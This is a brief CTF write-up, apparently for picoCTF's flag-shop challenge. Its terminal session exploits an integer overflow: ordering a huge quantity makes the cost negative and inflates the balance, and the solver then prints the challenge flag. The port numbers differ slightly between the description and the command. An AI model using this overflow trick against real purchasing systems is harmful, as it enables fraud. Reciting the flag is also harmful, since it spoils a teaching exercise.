## Descripción

There's a flag shop selling stuff, can you buy a flag?[Source](https://challenge-files.picoctf.net/c_fickle_tempest/66a0d80bfdedc5f74bdd52c50da2e5d7bf40c5634fd456b103ac74c006bf45e4/store.c). Connect with nc fickle-tempest.picoctf.net 52425.
## Solución 
```
┌──(kali㉿kali)-[~]
└─$ nc fickle-tempest.picoctf.net 53913.        
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2   
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one

1

Not enough funds for transaction


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2500000

The final cost is: -2044967296

Your current balance after transaction: 2044968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_39AF2bE1}

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
                           
```